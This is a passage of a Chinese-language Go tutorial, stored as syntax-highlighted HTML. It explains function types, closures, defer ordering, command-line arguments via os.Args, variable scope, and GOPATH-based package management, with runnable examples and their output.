class="hljs-keyword">return</span>&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := Calc(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, add)fmt.Println(<span class="hljs-string">&quot;add a:&quot;</span>, a)a = Calc(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, minus)fmt.Println(<span class="hljs-string">&quot;minus a:&quot;</span>, a)a = Calc(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, mul)fmt.Println(<span class="hljs-string">&quot;mul a:&quot;</span>, a)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">add a: 7</span><span class="hljs-comment">minus a: -1</span><span class="hljs-comment">mul a: 12</span><span class="hljs-comment">*/</span></code></pre><p>注意：关键字 <code>type</code> 定义的函数类型的数据类型是什么，其他函数也必须跟它一样，不然数据类型不匹配就会报错。</p><h2 id="五、匿名函数与闭包"><a href="#五、匿名函数与闭包" class="headerlink" title="五、匿名函数与闭包"></a>五、匿名函数与闭包</h2><p>匿名函数是指不需要定义函数名称的一种函数实现方式。<br>在 Golang 中，所有的匿名函数（Golang 规范中称之为函数字面量）都是闭包。<br>闭包就是一个函数”捕获”了和它在同一作用域的其他常量和变量，闭包不关心”捕获”的常量和变量是否已经超出了作用域，只要闭包还在使用它们，这些常量和变量就还会存在。<br>闭包需要通过匿名函数来实现。</p><h3 id="5-1-无参无返回值的匿名函数"><a href="#5-1-无参无返回值的匿名函数" class="headerlink" title="5.1 无参无返回值的匿名函数"></a>5.1 无参无返回值的匿名函数</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;age := <span class="hljs-number">11</span>name := <span class="hljs-string">&quot;golang&quot;</span><span class="hljs-comment">//定义匿名函数</span>f1 := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123; <span class="hljs-comment">//自动推导成为函数类型</span>fmt.Println(<span class="hljs-string">&quot;name=&quot;</span>, name)fmt.Println(<span class="hljs-string">&quot;age=&quot;</span>, age)&#125;f1() <span class="hljs-comment">//调用匿名函数</span><span class="hljs-keyword">type</span> myFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> //无参无返回值的函数类型</span><span class="hljs-keyword">var</span> f2 myFunc      <span class="hljs-comment">//声明变量f2为myFunc类型</span>f2 = f1            <span class="hljs-comment">//都是无参无返回值的同类型函数，所以可以相互赋值</span>f2()   <span class="hljs-comment">//本质上就是在调用f1</span><span class="hljs-comment">//定义匿名函数且同时调用</span><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;name=%s\tage=%d\n&quot;</span>, name, age)&#125;() <span class="hljs-comment">//这个圆括号代表直接调用此匿名函数</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">name= golang</span><span class="hljs-comment">age= 11</span><span class="hljs-comment">name= golang</span><span class="hljs-comment">age= 11</span><span class="hljs-comment">name=golangage=11</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-2-带参数的匿名函数"><a href="#5-2-带参数的匿名函数" class="headerlink" title="5.2 带参数的匿名函数"></a>5.2 带参数的匿名函数</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//匿名函数不需要写函数名称，这里只写上参数即可</span><span class="hljs-comment">//例如：func(i, j int) &#123;/**/&#125;</span><span class="hljs-comment">//自动类型推导</span>f1 := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;i=%d,j=%d\n&quot;</span>, i, j)&#125;f1(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;i=%d,j=%d\n&quot;</span>, i, j)&#125;(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>) <span class="hljs-comment">//简单粗暴，定义且直接调用，记得小括号中要给参数，因为定义了有2个参数</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">i=1,j=2</span><span class="hljs-comment">i=10,j=20</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-3-有参数有返回值"><a href="#5-3-有参数有返回值" class="headerlink" title="5.3 有参数有返回值"></a>5.3 有参数有返回值</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;x, y := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-keyword">int</span>)</span> <span class="hljs-params">(max, min <span class="hljs-keyword">int</span>)</span></span> &#123;<span class="hljs-keyword">if</span> i &gt; j &#123;max = imin = j&#125; <span class="hljs-keyword">else</span> &#123;max = jmin = i&#125;<span class="hljs-keyword">return</span> <span class="hljs-comment">//定义了返回值，必须写上return</span>&#125;(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>) <span class="hljs-comment">//这里加小括号表示直接调用</span>fmt.Printf(<span class="hljs-string">&quot;max=%d,min=%d\n&quot;</span>, x, y) <span class="hljs-comment">//max=20,min=10</span>&#125;</code></pre><h3 id="5-4-闭包捕获外部变量的特点"><a href="#5-4-闭包捕获外部变量的特点" class="headerlink" title="5.4 闭包捕获外部变量的特点"></a>5.4 闭包捕获外部变量的特点</h3><p>闭包是以 <code>引用</code> 的方式去捕获外部变量，用的是同一个变量。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>b := <span class="hljs-string">&quot;str bbb&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//闭包以引用方式捕获外部变量</span>a = <span class="hljs-number">999</span>      <span class="hljs-comment">//直接赋值，这里改了会影响外部，外部也被修改了</span>b = <span class="hljs-string">&quot;golang&quot;</span> <span class="hljs-comment">//直接赋值，这里改了会影响外部，外部也被修改了</span>fmt.Printf(<span class="hljs-string">&quot;内部，a=%d,b=%s\n&quot;</span>, a, b)&#125;() <span class="hljs-comment">//()代表直接调用，否则就需要用一个变量去接收这个匿名函数</span>fmt.Printf(<span class="hljs-string">&quot;外部，a=%d,b=%s\n&quot;</span>, a, b)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">内部，a=999,b=golang</span><span class="hljs-comment">外部，a=999,b=golang</span><span class="hljs-comment">*/</span></code></pre><p>但是，如果在闭包内使用海象运算符 <code>:=</code> 声明了新变量，那么新变量就跟外部没有关系了。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>b := <span class="hljs-string">&quot;str bbb&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">999</span>b := <span class="hljs-string">&quot;golang&quot;</span>fmt.Printf(<span class="hljs-string">&quot;内部，a=%d,b=%s\n&quot;</span>, a, b)&#125;() <span class="hljs-comment">//()代表直接调用，否则就需要用一个变量去接收这个匿名函数</span>fmt.Printf(<span class="hljs-string">&quot;外部，a=%d,b=%s\n&quot;</span>, a, b)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">内部，a=999,b=golang</span><span class="hljs-comment">外部，a=10,b=str bbb</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-5-只要闭包还在使用，变量就还存在"><a href="#5-5-只要闭包还在使用，变量就还存在" class="headerlink" title="5.5 只要闭包还在使用，变量就还存在"></a>5.5 只要闭包还在使用，变量就还存在</h3><p>闭包”捕获”外部变量并不会去关心它的作用域，只要闭包还在使用这些变量，变量就会存在。也就是说闭包有记忆变量的特性。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123; <span class="hljs-comment">//返回值是一个匿名函数，该匿名函数有一个int类型的返回值</span><span class="hljs-keyword">var</span> x <span class="hljs-keyword">int</span><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123; <span class="hljs-comment">//return语句后面接上这个匿名函数的函数体</span>x++<span class="hljs-keyword">return</span> x * x&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;f := test1()fmt.Println(f())fmt.Println(f())fmt.Println(f())fmt.Println(f())&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">1</span><span class="hljs-comment">4</span><span class="hljs-comment">9</span><span class="hljs-comment">16</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-6-注意事项"><a href="#5-6-注意事项" class="headerlink" title="5.6 注意事项"></a>5.6 注意事项</h3><p>1.匿名函数定义了必须要有变量去接收，或者在最后接圆括号 <code>()</code> 直接调用它。<br>2.闭包不能在函数体外声明。</p><h2 id="六、defer"><a href="#六、defer" class="headerlink" title="六、defer"></a>六、defer</h2><p><code>defer</code> 用于延迟一个函数、方法、或者当前所创建的匿名函数的执行。常用于函数执行完毕被释放前的一些清理工作。<br><strong>defer 只能出现在函数或者方法的内部</strong>！</p><h3 id="6-1-最基本的例子"><a href="#6-1-最基本的例子" class="headerlink" title="6.1 最基本的例子"></a>6.1 最基本的例子</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;aaa&quot;</span>)<span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;bbb&quot;</span>) <span class="hljs-comment">//最后才执行的</span>fmt.Println(<span class="hljs-string">&quot;ccc&quot;</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">aaa</span><span class="hljs-comment">ccc</span><span class="hljs-comment">bbb</span><span class="hljs-comment">*/</span></code></pre><h3 id="6-2-多个defer的执行顺序"><a href="#6-2-多个defer的执行顺序" class="headerlink" title="6.2 多个defer的执行顺序"></a>6.2 多个defer的执行顺序</h3><p>一个函数中有多个<code>defer</code>语句，它们会以<code>FILO</code>(先进后出)的顺序执行，哪怕函数或某个延迟调用发生错误，这些调用依旧会被执行。<br>多个<code>defer</code>的执行顺序的演示：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-keyword">int</span>)</span></span> &#123;x := <span class="hljs-number">100</span> / afmt.Println(<span class="hljs-string">&quot;x = &quot;</span>, x)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">/**</span><span class="hljs-comment">fmt.Println(&quot;aaaaaaaaaaa&quot;)</span><span class="hljs-comment">fmt.Println(&quot;bbbbbbbbbbb&quot;)</span><span class="hljs-comment"></span><span class="hljs-comment">//调用一个函数，导致内存出问题</span><span class="hljs-comment">test(0)</span><span class="hljs-comment"></span><span class="hljs-comment">fmt.Println(&quot;ccccccccccc&quot;)</span><span class="hljs-comment"></span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">aaaaaaaaaaa</span><span class="hljs-comment">bbbbbbbbbbb</span><span class="hljs-comment">panic: runtime error: integer divide by zero</span><span class="hljs-comment">**/</span><span class="hljs-comment">/**</span><span class="hljs-comment">defer fmt.Println(&quot;aaaaaaaaaaa&quot;)</span><span class="hljs-comment">defer fmt.Println(&quot;bbbbbbbbbbb&quot;)</span><span class="hljs-comment"></span><span class="hljs-comment">//调用一个函数，导致内存出问题</span><span class="hljs-comment">test(0)</span><span class="hljs-comment"></span><span class="hljs-comment">defer fmt.Println(&quot;ccccccccccc&quot;) //这个defer还没有进栈中，所以不会打印出这行的内容，只会打印上面两行的内容</span><span class="hljs-comment"></span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">bbbbbbbbbbb</span><span class="hljs-comment">aaaaaaaaaaa</span><span class="hljs-comment">panic: runtime error: integer divide by zero</span><span class="hljs-comment">**/</span><span class="hljs-comment">/*</span><span class="hljs-comment">defer fmt.Println(&quot;aaaaaaaaaaa&quot;)</span><span class="hljs-comment">defer fmt.Println(&quot;bbbbbbbbbbb&quot;)</span><span class="hljs-comment"></span><span class="hljs-comment">//调用一个函数，导致内存出问题</span><span class="hljs-comment">defer test(0) //报错时，会放到最后一个被显示出来</span><span class="hljs-comment"></span><span class="hljs-comment">defer fmt.Println(&quot;ccccccccccc&quot;)</span><span class="hljs-comment"></span><span class="hljs-comment"></span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">ccccccccccc</span><span class="hljs-comment">bbbbbbbbbbb</span><span class="hljs-comment">aaaaaaaaaaa</span><span class="hljs-comment">panic: runtime error: integer divide by zero</span><span class="hljs-comment">*/</span><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;aaaaaaaaaaa&quot;</span>)<span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;bbbbbbbbbbb&quot;</span>)<span class="hljs-keyword">defer</span> test(<span class="hljs-number">1</span>) <span class="hljs-comment">//在没有报错的情况下，defer 将按照先进后出的顺序执行</span><span class="hljs-keyword">defer</span> fmt.Println(<span class="hljs-string">&quot;ccccccccccc&quot;</span>)<span class="hljs-comment">/*运行结果：</span><span class="hljs-comment">ccccccccccc</span><span class="hljs-comment">x =  100</span><span class="hljs-comment">bbbbbbbbbbb</span><span class="hljs-comment">aaaaaaaaaaa</span><span class="hljs-comment">*/</span>&#125;</code></pre><h3 id="6-2-defer和匿名函数结合使用"><a href="#6-2-defer和匿名函数结合使用" class="headerlink" title="6.2 defer和匿名函数结合使用"></a>6.2 defer和匿名函数结合使用</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>b := <span class="hljs-number">20</span><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;defer语句，匿名函数内部：a=%d,b=%d\n&quot;</span>, a, b)&#125;() <span class="hljs-comment">//()代表匿名函数直接执行</span>a = <span class="hljs-number">111</span>b = <span class="hljs-number">222</span>fmt.Printf(<span class="hljs-string">&quot;外部：a=%d,b=%d\n&quot;</span>, a, b)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">外部：a=111,b=222</span><span class="hljs-comment">defer语句，匿名函数内部：a=111,b=222</span><span class="hljs-comment">*/</span></code></pre><p>在上例的基础中，给匿名函数传递两个实参：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>b := <span class="hljs-number">20</span><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;匿名函数内部：a=%d,b=%d\n&quot;</span>, a, b)&#125;(a, b) <span class="hljs-comment">//()代表匿名函数直接执行，把参数传递过去，已经先传递参数，只是没有调用</span>a = <span class="hljs-number">111</span>b = <span class="hljs-number">222</span>fmt.Printf(<span class="hljs-string">&quot;外部：a=%d,b=%d\n&quot;</span>, a, b)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">外部：a=111,b=222</span><span class="hljs-comment">匿名函数内部：a=10,b=20</span><span class="hljs-comment">*/</span></code></pre><h2 id="七、获取命令行参数"><a href="#七、获取命令行参数" class="headerlink" title="七、获取命令行参数"></a>七、获取命令行参数</h2><p>无论在哪个系统中敲命令，或多或少都会遇到带着参数的命令。比如：<code>ping www.google.com</code>，<code>ping</code> 是一个可执行程序 ，<a href="http://www.google.com/">www.google.com</a> 就是参数。<br>命令行以空格 <code>space</code> 区分各个参数，且以字符串方式传递！</p><h3 id="7-1-如何实现"><a href="#7-1-如何实现" class="headerlink" title="7.1 如何实现"></a>7.1 如何实现</h3><p>需要用到 Golang 自带的 <code>os.Args</code> 变量，按<code>F2</code>即可看到官方对于这个变量的描述：</p><pre><code class="hljs go"><span class="hljs-comment">// Args hold the command-line arguments, starting with the program name.</span><span class="hljs-keyword">var</span> Args []<span class="hljs-keyword">string</span></code></pre><p>Args 保持住命令行参数，从程序自身的名字开始。</p><h3 id="7-2-最基本的例子"><a href="#7-2-最基本的例子" class="headerlink" title="7.2 最基本的例子"></a>7.2 最基本的例子</h3><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> (<span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-string">&quot;os&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;list := os.Argsn := <span class="hljs-built_in">len</span>(list)fmt.Println(<span class="hljs-string">&quot;n = &quot;</span>, n)<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(list); i++ &#123;fmt.Printf(<span class="hljs-string">&quot;list[%d] = %s\n&quot;</span>, i, list[i])&#125;fmt.Println(<span class="hljs-string">&quot;++++++++++++++++&quot;</span>)<span class="hljs-keyword">for</span> i, data := <span class="hljs-keyword">range</span> list &#123;fmt.Printf(<span class="hljs-string">&quot;list[%d] = %s\n&quot;</span>, i, data)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">go run 48_获取命令行参数.go 4 42</span><span class="hljs-comment">n =  3</span><span class="hljs-comment">list[0] = C:\Users\ADMINI~1\AppData\Local\Temp\go-build346730226\b001\exe\48_获取命令行参数.exe</span><span class="hljs-comment">list[1] = 4</span><span class="hljs-comment">list[2] = 42</span><span class="hljs-comment">++++++++++++++++</span><span class="hljs-comment">list[0] = C:\Users\ADMINI~1\AppData\Local\Temp\go-build346730226\b001\exe\48_获取命令行参数.exe</span><span class="hljs-comment">list[1] = 4</span><span class="hljs-comment">list[2] = 42</span><span class="hljs-comment">*/</span></code></pre><p>第一个参数是程序自己本身的名称。<br>直接 <code>go run</code> 的方式只是人类自己看起来省力而已，Golang 底层依旧会先去编译并生成一个可执行程序，然后再运行这个可执行程序，如下图所示：</p><h2 id="八、作用域"><a href="#八、作用域" class="headerlink" title="八、作用域"></a>八、作用域</h2><p>作用域就是：变量起作用的范围。</p><h3 id="8-1-局部变量的特点"><a href="#8-1-局部变量的特点" class="headerlink" title="8.1 局部变量的特点"></a>8.1 局部变量的特点</h3><p>执行到定义变量的那句话，才开始分配内存空间，离开作用域被自动回收且被释放。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <span class="hljs-comment">//必须</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;a := <span class="hljs-number">10</span>fmt.Println(<span class="hljs-string">&quot;a = &quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//定义在&#123;&#125;里面的变量就是局部变量，只能在&#123;&#125;里面有效</span><span class="hljs-comment">//执行到定义变量那句话，才开始分配空间，离开作用域自动释放</span><span class="hljs-comment">//作用域，变量其作用的范围</span><span class="hljs-comment">//a = 111</span>&#123;i := <span class="hljs-number">10</span> <span class="hljs-comment">//块级作用域，出了这对大括号的范围，i就会被自动释放</span>fmt.Println(<span class="hljs-string">&quot;i = &quot;</span>, i)&#125;<span class="hljs-comment">//i = 111</span><span class="hljs-keyword">if</span> flag := <span class="hljs-number">3</span>; flag == <span class="hljs-number">3</span> &#123; <span class="hljs-comment">//flag同样也是块级作用域内的变量，出了if块被自动回收并释放</span>fmt.Println(<span class="hljs-string">&quot;flag = &quot;</span>, flag)&#125;flag = <span class="hljs-number">4</span>&#125;</code></pre><h3 id="8-2-全局变量的特点"><a href="#8-2-全局变量的特点" class="headerlink" title="8.2 全局变量的特点"></a>8.2 全局变量的特点</h3><p>1.定义在函数外部的变量叫全局变量。<br>2.全局变量不能使用海象运算符 <code>:=</code> 声明。<br>3.<code>const</code> 声明的名称不再是全局变量，而是 <code>常量</code> 了，是不允许被修改的。</p><pre><code class="hljs go"><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span> <span class="hljs-comment">//这个a是全局变量，可以给赋值</span><span class="hljs-keyword">const</span> b = <span class="hljs-number">10</span> <span class="hljs-comment">//const声明的b是常量了，不能给赋值</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;a = <span class="hljs-number">10</span>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)b = <span class="hljs-number">20</span> <span class="hljs-comment">//cannot assign to b ===&gt; 不能赋值给b</span>&#125;</code></pre><h3 id="8-3-不同作用域同名变量"><a href="#8-3-不同作用域同名变量" class="headerlink" title="8.3 不同作用域同名变量"></a>8.3 不同作用域同名变量</h3><p>1.不同作用域允许定义同名变量。<br>2.使用变量的原则：就近原则。</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;fmt.Printf(<span class="hljs-string">&quot;in test, a type is : %T\n&quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">var</span> a <span class="hljs-keyword">byte</span>fmt.Printf(<span class="hljs-string">&quot;in main, a type is : %T\n&quot;</span>, a)&#123;<span class="hljs-keyword">var</span> a <span class="hljs-keyword">float64</span>fmt.Printf(<span class="hljs-string">&quot;in block, a type is : %T\n&quot;</span>, a)&#125;test()&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">in main, a type is : uint8</span><span class="hljs-comment">in block, a type is : float64</span><span class="hljs-comment">in test, a type is : int</span><span class="hljs-comment">*/</span></code></pre><p>找全局变量的时候，是<code>引用</code>全局变量：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-keyword">var</span> a <span class="hljs-keyword">int</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;a = <span class="hljs-number">10</span> <span class="hljs-comment">//引用全局变量，会修改其结果</span>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;test()fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a) <span class="hljs-comment">//依然是引用，test函数中已改变了其值，所以也将引用改变后的值</span>&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">a= 10</span><span class="hljs-comment">a= 10</span><span class="hljs-comment">*/</span></code></pre><h2 id="九、工程管理"><a href="#九、工程管理" class="headerlink" title="九、工程管理"></a>九、工程管理</h2><h3 id="9-1-Go1-11-版本之前的工作区"><a href="#9-1-Go1-11-版本之前的工作区" class="headerlink" title="9.1 Go1.11 版本之前的工作区"></a>9.1 Go1.11 版本之前的工作区</h3><p>Go1.11 版本之前，使用 GOPATH 来管理工程。</p><h4 id="9-1-1-工作区介绍"><a href="#9-1-1-工作区介绍" class="headerlink" title="9.1.1 工作区介绍"></a>9.1.1 工作区介绍</h4><p>Golang 代码必须放在工作区中。工作区是对应一个特定工程的目录，它应包含 3 个子目录：<br>1.src目录<br>用于以代码包的形式组织并保存 Go 源代码文件。（比如：<code>.go</code> <code>.c</code> <code>.h</code> <code>.s</code> …）<br>src用于包含所有的源代码，是 Go1.11 版本之前，命令行工具的强制规则。<br>2.pkg目录<br>用于存放由 <code>go install</code> 命令构建安装后的代码包（包含 go 库源码文件）的 <code>.a</code> 归档文件。<br>3.bin目录<br>与 pkg 目录类似，在通过 <code>go install</code> 命令完成安装后，保存由 Go 命令源码文件生成的可执行文件。</p><h4 id="9-1-2-GOPATH设置"><a href="#9-1-2-GOPATH设置" class="headerlink" title="9.1.2 GOPATH设置"></a>9.1.2 GOPATH设置</h4><p>标准库中的包会在安装 Go 语言的位置找到。程序员自己创建的包会在 <code>GOPATH</code> 环境变量指定的目录中查找。<br>首先需要把工程目录的根路径加入到环境变量 <code>GOPATH</code> 中，这样才能构建这个工程。否则，即使处于同一工作目录（工作区），代码之间也无法通过绝对代码包路径完成调用。<br>src 这个目录是强制要求存在，而 pkg 和 bin 目录则无需手动创建，Go 命令行工具在构建过程中会自动创建这些目录。<br>特别注意：只有当环境变量 <code>GOPATH</code> 中只包含一个工作区的目录路径时，<code>go install</code> 命令才会把命令源码安装到当前工作区的 bin 目录下。如果环境变量 <code>GOPATH</code> 中包含多个工作区的路径，则必须设置环境变量 <code>GOBIN</code>，否则执行 <code>go install</code> 命令就会失效。</p><h4 id="9-1-3-分文件编程（同一个目录下）"><a href="#9-1-3-分文件编程（同一个目录下）" class="headerlink" title="9.1.3 分文件编程（同一个目录下）"></a>9.1.3 分文件编程（同一个目录下）</h4><p>1.多个源文件，必须放在 <code>src</code> 目录下。<br>2.设置 <code>GOPATH</code> 环境变量时，注意：别把 <code>src</code> 目录包含进去。<br>3.同一个目录，包名必须一样。<br>4.同一个目录，调用别的文件中的函数，无需加包名引用直接调用即可。</p><h4 id="9-1-4-分文件编程（不同目录下）"><a href="#9-1-4-分文件编程（不同目录下）" class="headerlink" title="9.1.4 分文件编程（不同目录下）"></a>9.1.4 分文件编程（不同目录下）</h4><p>1.依旧必须放在 <code>src</code> 目录下。<br>2.不同目录，包名不一样。<br>3.调用不同包里面的函数，格式：<code>包名.函数名()</code>。<br>4.<strong>被调用的其他包里的函数名称首字母必须大写，否则对其他包不可见</strong></p><h4 id="9-1-5-包"><a href="#9-1-5-包" class="headerlink" title="9.1.5 包"></a>9.1.5 包</h4><h5 id="9-1-5-1-自定义包"><a href="#9-1-5-1-自定义包" class="headerlink" title="9.1.5.1 自定义包"></a>9.1.5.1 自定义包</h5><p>创建的自定义包最好放在<code>GOPATH</code>的<code>src</code>目录下（或者<code>GOPATH</code> <code>src</code>的某个子目录下）<br>在Golang中，代码包中的源码文件名是可以任意的，但这些源码文件都必须以包声明语句作为文件中非注释语句的第一行，每个包都对应一个独立的空间<br>例：<br><code>package calc</code><br>包中成员以名称首字母大小写决定访问权限：首字母大写可被包外访问，首字母小写仅包内成员可以访问。<br>注意：<strong>同一个目录（文件夹）中，每个 go 文件所声明的包名称必须一样</strong>！</p><h5 id="9-1-5-2-给包起个别名"><a href="#9-1-5-2-给包起个别名" class="headerlink" title="9.1.5.2 给包起个别名"></a>9.1.5.2 给包起个别名</h5><p>语法：<code>import 新名字 原本的包名</code>。</p><pre><code class="hljs go"><span class="hljs-comment">//新名字+原本的名字</span><span class="hljs-keyword">import</span> myFMT <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;myFMT.Println(<span class="hljs-string">&quot;test info.&quot;</span>)&#125;</code></pre><h5 id="9-1-5-3-忽略丢弃一个包"><a href="#9-1-5-3-忽略丢弃一个包" class="headerlink" title="9.1.5.3 忽略丢弃一个包"></a>9.1.5.3 忽略丢弃一个包</h5><p>引入包的时候使用 <code>_</code>，主要是为了让 Golang 自动调用那个包中的 init() 函数。<br>例如，我有这么一个项目结构：</p><pre><code class="hljs go">hellohello.<span class="hljs-keyword">go</span>main.<span class="hljs-keyword">go</span></code></pre><p>hello/hello.go 中的代码如下：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> hello<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;this message from hello/hello.go init() function.&quot;</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Add</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<span class="hljs-keyword">return</span> a + b&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintHello</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;hello 